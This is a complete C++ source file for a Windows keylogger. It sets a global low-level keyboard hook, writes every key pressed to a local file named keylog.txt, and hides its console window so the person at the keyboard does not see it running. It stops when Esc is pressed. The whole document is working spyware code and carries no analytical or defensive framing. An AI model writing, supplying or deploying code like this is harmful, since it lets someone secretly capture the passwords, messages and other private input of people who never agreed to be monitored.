#include <windows.h>
#include <fstream>
#include <iostream>

HHOOK hKeyHook;
std::ofstream logFile("keylog.txt", std::ios::app);

// 🧠 Keylogging Function with Esc to Exit
LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = keyInfo->vkCode;

        // 🔑 Stop program on Esc key
        if (vkCode == VK_ESCAPE) {
            PostQuitMessage(0);
        }

        // 📄 Log readable key names
        char keyName[128];
        if (GetKeyNameTextA((LONG)(keyInfo->scanCode << 16), keyName, sizeof(keyName)) > 0) {
            logFile << "[" << keyName << "] ";
        } else {
            logFile << "[VK " << vkCode << "] ";
        }

        logFile.flush();  // 📝 Force immediate write
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
    // 🫥 Hide console window
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    MSG msg;
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, NULL, 0);

    if (!hKeyHook) {
        MessageBox(NULL, "Hook installation failed.", "Error", MB_ICONERROR);
        return 1;
    }

    // (Optional) Background signal
    // MessageBox(NULL, "Logging started. Press Esc to stop.", "Keylogger", MB_OK);

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 🧹 Clean up
    UnhookWindowsHookEx(hKeyHook);
    logFile.close();
    return 0;
}
